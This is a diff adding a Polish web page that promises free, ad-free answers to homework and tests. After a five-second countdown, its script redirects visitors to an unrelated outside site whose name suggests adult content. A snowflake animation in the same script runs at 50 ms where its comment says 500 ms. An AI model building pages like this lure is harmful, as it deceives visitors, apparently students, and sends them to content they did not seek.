@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <meta name="description" content="Kod źródłowy wiodącej strony z odpowiedziami do zadań domowych, kartkówek i sprawdzianów.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display&display=swap" rel="stylesheet">
+    <title>Odpowiedzi Szkoła</title>
+</head>
+<body>
+    <div class="intro">
+        <h1>Darmowe odpowiedzi do prac domowych i testów, bez reklam</h1>
+        <p id="countdown">Zostaniesz przekierowany za <span id="seconds">5</span> sekund</p>
+    </div>
+    <div class="snowflake"></div>
+    <div class="snowflake"></div>
+    <div class="snowflake"></div>
+    <div class="snowflake"></div>
+    <div class="snowflake"></div>
+    
+
+    <script>
+        // Ustaw czas odliczania w sekundach
+        var countdownSeconds = 5;
+
+        // Funkcja do aktualizowania odliczania
+        function updateCountdown() {
+            var secondsSpan = document.getElementById("seconds");
+            secondsSpan.textContent = countdownSeconds;
+            countdownSeconds--;
+
+            // Przekieruj po zakończeniu odliczania
+            if (countdownSeconds < 0) {
+                window.location.href = "https://www.ice-gay.com/"; // Zmień na odpowiednią ścieżkę URL
+            }
+        }
+
+        // Uruchom odliczanie po załadowaniu strony
+        updateCountdown();
+        setInterval(updateCountdown, 1000); // Aktualizuj co 1 sekundę
+
+        // Funkcja do generowania losowych pozycji dla śniegu
+        function getRandomPosition() {
+            var left = Math.random() * window.innerWidth;
+            var top = -10; // Początkowa pozycja góra ekranu
+            return { left: left, top: top };
+        }
+
+        // Tworzenie śniegu w losowych pozycjach z określonym interwałem
+        function createSnowflake() {
+            var snowflake = document.createElement('div');
+            snowflake.className = 'snowflake';
+            var position = getRandomPosition();
+            snowflake.style.left = position.left + 'px';
+            snowflake.style.top = position.top + 'px';
+            document.body.appendChild(snowflake);
+
+            // Usuwanie śniegu po zakończeniu opadania
+            snowflake.addEventListener('animationiteration', function () {
+                document.body.removeChild(snowflake);
+                createSnowflake();
+            });
+        }
+
+        // Tworzenie śniegu co 0.5 sekundy (500 milisekund)
+        setInterval(createSnowflake, 50);
+    </script>
+</body>
+</html>
